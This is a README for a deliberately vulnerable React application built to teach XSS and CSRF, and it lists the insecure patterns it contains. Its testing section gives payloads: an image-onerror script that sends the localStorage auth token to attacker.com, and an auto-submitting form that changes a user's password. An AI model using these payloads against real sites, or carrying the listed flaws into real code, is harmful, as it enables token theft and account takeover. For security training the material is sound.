# Vulnerable React.js Application

This application was intentionally designed with security vulnerabilities for educational purposes to demonstrate XSS and CSRF attacks. It serves as a practical example for understanding web security vulnerabilities in modern React applications.

## Security Warning

**DO NOT USE THIS APPLICATION IN PRODUCTION OR EXPOSE IT TO THE INTERNET**

This application contains intentional security vulnerabilities including:
- Cross-Site Scripting (XSS) vulnerabilities
- Cross-Site Request Forgery (CSRF) vulnerabilities  
- Insecure authentication token storage

## Features

- User authentication (login/register)
- Profile management
- Password changing functionality
- Comment system

## Vulnerabilities Overview

### XSS Vulnerabilities

1. **Unsafe use of `dangerouslySetInnerHTML`**: The application directly renders user input using React's `dangerouslySetInnerHTML` without sanitization.
   - Location: `Profile.tsx` in the bio preview and comments sections

2. **Token storage in localStorage**: Authentication tokens are stored in localStorage, making them accessible to JavaScript and vulnerable to theft through XSS.
   - Location: `AuthContext.tsx`

### CSRF Vulnerabilities

1. **No CSRF Tokens**: The application does not implement CSRF tokens for state-changing operations.
   - Location: `ChangePassword.tsx` and other form submissions

2. **No SameSite Cookie Attributes**: Authentication cookies don't have SameSite attributes, making them vulnerable to CSRF attacks.

## Installation and Running

```bash
# Install dependencies
npm install

# Run the application
npm start
```

## Testing the Vulnerabilities

### XSS Exploitation

You can test XSS vulnerabilities by entering the following payloads:

1. In the bio or comment fields:
```
<img src="x" onerror="alert('XSS')">
```

2. Token stealing payload:
```
<img src="x" onerror="fetch('https://attacker.com/steal?token='+localStorage.getItem('authToken'))">
```

### CSRF Exploitation

Create an HTML file on a separate server with the following content to test CSRF:

```html
<html>
  <body>
    <form action="http://localhost:3000/api/change-password" method="POST" id="csrf-form">
      <input type="hidden" name="newPassword" value="hackedpassword" />
    </form>
    <script>
      document.getElementById("csrf-form").submit();
    </script>
  </body>
</html>
```

## License

This project is for educational purposes only.
